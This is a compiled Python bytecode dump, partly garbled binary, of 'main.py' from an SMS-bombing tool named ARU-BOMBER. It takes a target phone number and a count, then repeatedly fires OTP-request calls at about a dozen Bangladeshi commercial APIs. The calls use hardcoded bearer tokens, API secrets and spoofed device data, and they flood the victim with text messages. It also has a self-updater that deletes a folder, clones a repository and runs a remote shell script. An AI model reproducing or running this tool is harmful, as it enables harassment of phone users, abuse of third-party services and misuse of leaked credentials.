o
    kc?6  ?                   @   s?  d dl Z d dlZd dlZd dlZd dlZd dlZd dlmZ d dlZdZ	dZ
dZdZdZdZdZd	Zd
Ze?d? e?? jZedd??? Zze ?d?jZW n   dZY zEe ?d?jZedkr?eee d e ? e?d? eee d e ? e?d? e?d? e?d? eee d e ? e?d? n	 W n   Y dd? Zdd? Zdd? Zd d!? Z d"d#? Z!d$d%? Z"d&d'? Z#d(d)? Z$e$?  dS )*?    N)?CaseInsensitiveDictz[94mz[91mz[97mz[93mz[1;32mz[96mz[1mz[0m?clearz./.more/.version/version.txt?rz`https://raw.githubusercontent.com/Aru-Ofc-git/ARU-BOMBER/master/.main/.more/.version/version.txtz0.0.1z^https://raw.githubusercontent.com/Aru-Ofc-git/ARU-BOMBER/master/.main/.more/.version/check.txtZyes?  Update Found...?   ?  Updating Tools...?   ?Scd && rm -rf ARU-BOMBER &&  git clone https://github.com/Aru-Ofc-git/ARU-BOMBER.git?   z  Update Comete...?cd ARU-BOMBER && bash bomber.shc                 C   s(   | d D ]}t j?|? t j??  qd S ?N?
)?sys?stdout?write?flush)?word?type? r   ?main.py?printByWord+   s   ?r   c                 C   s2   | d D ]}t j?|? t j??  t?|? qd S r   )r   r   r   r   ?time?sleep)r   ?tr   r   r   r   ?printByWordHigh/   s
   
?r   c                   C   s(   t ?d?t?? t ?d?td ?? d S )Nzlolcat banner.pyzlolcat text.pyr   )?os?system?center?columnsr   r   r   r   ?header4   s   r   c                   C   ?    t dt t d?t? d? d S )Nr   zInvalid Input?{?G?zt??r   ?bold?redr   r   r   r   r   r   ?invalidInput7   ?    r%   c                   C   r    )Nr   z
 SMS Sent.r!   )r   r#   ?greenr   r   r   r   r   r   ?smsSent9   r&   r(   c                   C   r    )Nr   zSMS Not Sent.r!   r"   r   r   r   r   ?
smsNotSent;   r&   r)   c                   C   s   t td ? d S )Nzg
    	[1] SMS Bombing
    	[2] Update Tools
   	[3] Follow Oue Facebook
    	[4] Follow Our Github
    )?printr'   r   r   r   r   ?option=   s   r+   c            2      C   st  t ?  t?  tttt d t t ??} d| v ?r?t?	d? t ?  tttd t ??}t
ttd t ??}|}|dk?r?|dk?r?d}t?	d? t ?  ttd	 | d
 t|? d ? ||k ?r?d}ddddddd?}d| d }d}ddddddddd?}	d| }
d}dd ddd!d"ddd#d$?	}d%| d& }d'}d(d)d*dd+d,dd-d.dd/d0?}d1|? ?}d2}d3d4d5d6d7d8dd9d:ddd;d<?}d=| d> }d?| }d@dAdBdddCddD?}dE}dFddGdHdddCdI?}dJ| dK }dL}dMddN?}dO| dP }dQ}t? }d|dR< dS}dRdi}dT| dK } dU}!dRdi}"dV| dW }#?zvtj|||dX?}$|$?? dY dZk?r+t?  |d[7 }nt?  	 tj||	|
dX?}%|%?? dY d\k?rHt?  |d[7 }nt?  	 tj|||dX?}&|&?? d] d^k?rn|&?? d_ d k?rnt?  |d[7 }nt?  	 tj|||dX?}'|'?? dY d`k?r?t?  |d[7 }nt?  	 tj|||dX?}(da|? db?})tj|||dX?}(|(?? dY |)k?r?t?  |d[7 }nt?  	 tj||dc?}*|*?? dY ddk?r?t?  |d[7 }nt?  	 tj|||dX?}+|+?? de df|? db?k?r?t?  |d[7 }nt?  	 tj|||dX?},|,?? d] dgk?rt?  |d[7 }nt?  	 tj||| dX?}-|-?? dh dik?r-t?  |d[7 }nt?  	 tj|!|"|#dX?}.|.?? dY da|? db?k?rNt?  |d[7 }nt?  	 tt?? jdj ?d dk? }/dl|/ dm | dK }0tj|||0dX?}1|1?? dn d^k?r?t?  |d[7 }nt?  	 W n   Y ||k s`d S d S t?  t?	d? t?  d S do| v ?r?t?	d? t ?  ttk?r?ttt dp t ? d S ttt dq t ? t?dr? ttt ds t ? t?dt? t?	du? t?dv? ttt dw t ? t?	dx? d S dy| v ?rt?	d? t ?  t?	dz? td{? d S d|| v ?r(t?	d? t ?  t?	d}? td~? d S t?  t?dt? t?	d? t?  d S )Nz        [>] Choose a option: ?1r   z"    [>] Enter your Target Number: z*    [>] Enter amount [MIN 10 and MAX 50]: ?2   ?	   r   u?    		╔═══════════════════════════════╗
		║[96m Target Number: [93m+88u1    [0m[1;32m║
		║           [96mAmount:[93mu?   [0m     [1;32m      ║
		╚═══════════════════════════════╝
	zGhttps://api.arogga.com/v1/auth/sms/send?f=app&v=4.4.2&os=android&osv=25z!application/x-www-form-urlencodedZ208zapi.arogga.comz
Keep-Alive?gzipzokhttp/4.9.2)?Content-Type?Content-Length?Host?
Connection?Accept-Encoding?
User-Agentzmobile=%2B88z?&fcmToken=cEOAX8LsStSjfz5Yif6UwI%253AAPA91bE4BPqf6XIiAL22pD90rT8XrnU1bFRuBgu85LjipznTb6GHD-gOwOfKRkS9XYqxjYE_h24yWUgNgzBYcAJYrEzm-ngbqYoScMhkRnAYECyfuUtHC7f8LN71f6ppavr51mbomS6B&referral=z)http://nesco.sslwireless.com/api/v1/loginzapplication/json?enZ24znesco.sslwireless.comzokhttp/3.12.10)?Accept?languager0   r1   r2   r3   r4   r5   zphone_number=zNhttps://napi.dmoney.com.bd:6066/DmoneyPlatform/um_public_ekyc_checkMobileEmailZFSz?bearer 9gp0IvDK_5DX1StqaF4__rHnboeHCwayrMsdZ3aNGhoF1jykX7xyoQBASWnSTbnZ5NmMXDinOBhI4rjy-0mXcoPUsFu7Xbdga-sy3TunDsxToMzLqn-zB_3Opi7FbHOLU47kQFLzkPdF8_QADX9eC3Sy-j9IBH5JnoSvL4YADKZic6D_Ok8j7zwfWy3kcXKRgyFje5ft0s-5ztXWGUy-6YOGdbThWoy6LBbK_Yr3Ek8YYGi6z?Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H)znapi.dmoney.com.bd:6066Z493)	ZproductCodeZAuthorizationzaccept-languager0   r5   r2   r3   r4   r1   zN{"ekycApplicationData":{"emailId":"mr_kille@yahoo.com","id":0,"mobileNumber":"a?  ","productCode":"FS"},"channel":"ANDROID_APP","deviceName":"Asus ASUS_Z01QD Android 7.1.2","deviceNumber":"751405a75d71e619","hardwareSignature":"14879d1fcce97c13dd673ee7ce6d7f1c69f56f8880c2d2326f675473472c1dcefb603902376020fc0a75d8a3868a84ebb5c1211abe38c75583d412783bbfcb40","mobileAppVersion":"4.1.1_RELEASE","mobileAppVersionCode":37,"productCode":"FS","requestId":"2015BDC18305FBFB","sessionToken":""}z+https://ss.binge.buzz/api/v3/otp/send/loginzbuzz.binge.mobileZANDROIDZ65Zmob?closeZ17zss.binge.buzzzokhttp/4.3.1)zAPP-NAMEz	APP-AGENTzAPP-VERSIONr7   zDevice-Typer3   r0   r1   r2   r4   r5   zphone=z:https://resellerapp.shopup.com.bd/users/send_user_otp.jsonzIVoonik/5000087 Dalvik/2.1.0 (Linux; U; Android 7.1.2; G011A Build/N2G48H)Z5000087ZEnglishZfalseZresellerzvUSER_COUNTRY_CODE=IN; device_id=2fedf90cd67d8c76; environment=development; app_version_code=5000087; platform=android;Z137zresellerapp.shopup.com.bdzVgMDVlVSDBAEVlRQDwADU1E=)r5   Zapp_version_codezSet-Languagezsr-appzapp-nameZCookier0   r1   r2   r3   r4   zX-NewRelic-IDz?
                    {
                    "direct_login": true,
                    "user": {
                        "resend": false,
                        "login": "88z?",
                        "type": {
                        "register": true
                        }
                    }
                    }
                    z9https://fabrilife.com/api/wp-json/wc/v2/user/phone-login/Z(uzmgAMHfQrukDqV1ecZ2xJGwqjiVPnE0byuqw2MW?0zfabrilife.comzokhttp/3.12.12)Zotpkeyr1   r2   r3   r4   r5   r0   z2https://shop.shajgoj.com/wp-json/sg/v2/phone-loginZ uGCwSdPD27RMTpVWKrxOSNpAyR8DW16jZ23zshop.shajgoj.com)Zotpsecr0   r1   r2   r3   r4   r5   z
{"phone":"z"}z1https://prodapi.swap.com.bd/api/v1/send-otp/loginZ@QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3)zx-authorizationr0   z{"mobile_number":"z","referral":false}zOhttps://api.bdkepler.com/api_middleware-0.0.2-RELEASE/registration-generate-otpr0   z+http://27.131.15.19/lstyle/api/lsotprequestz${"shortcode": "2494905","msisdn":"88z2https://ucapi.vnksrvc.com/users/send_user_otp.jsonz;{"direct_login": true,"user": {"resend": false,"login": "88z","type": {"register": true}}})?headers?data?messagezSMS sent to your mobile number.?   zOTP has been Sent.?status??   ?errorszOTP sent successfullyzAn OTP has been sent to 88?.)r;   z4Please, check you SMS. We have sent you an OTP code.?msgz'A One Time Passcode has been sent to 88z<6 digit pin has been send to your number. Please check inboxZreponseZ
SUCCESSFUL??????
   z{"deviceId":"z&","operator": "Robi","walletNumber": "Z
statusCode?2z  Update Not Found.r   r   r   r   r	   r
   z  Update Complete...r   ?3z*xdg-open https://www.facebook.com/Aru.Ofc/ZTHANKS?4z'xdg-open http://github.com/Aru-Ofc-git/ZThanks)r   r+   ?str?inputr#   ?cyan?yellow?endr   r   ?intr*   r'   r   ?requestsZpost?jsonr(   r)   ?uuidZuuid4Zfieldsr%   ?main?version?versionCheckr   r   r   )2ZoptionInputZnumber?amount?m?iZ	urlAroggoZheadersAroggoZ
dataAroggoZurlNescoZheadersNescoZ	dataNescoZurlLankaZheadersLankaZ	dataLankaZurlBingeZheadersBingeZ	dataBingeZ	urlShopupZheadersShopupZ
dataShopupZurlFebZ
headersFebZ	urlSajgojZheadersSajgojZ
dataSajgojZurlSwapZheadersSwapZdataSwapZurlr;   ZurlWebaccesZheadersWebaccesZdataWebaccesZurlMokamZheadersMokamZ	dataMokamZ
respAroggoZ	respNescoZ	respLankaZ	respBingeZ
respShopupZ	shopupConZrespFebZ
respSajgojZrespSwapZrespWebaccesZ	respMokamZDeviceRandomr<   Zrespr   r   r   rR   D   s?  


????
?
??????

$








? ?? ,

















rR   )%rO   rP   r   r   r   ?shutilZrequests.structuresr   rQ   ZblueZ	lightbluer$   ZwhiterL   r'   rK   r#   rM   r   ?get_terminal_sizer   ?open?readrS   ?get?textrT   ?checkr   r   r   r   r%   r(   r)   r+   rR   r   r   r   r   ?<module>   sX   0 





? 
a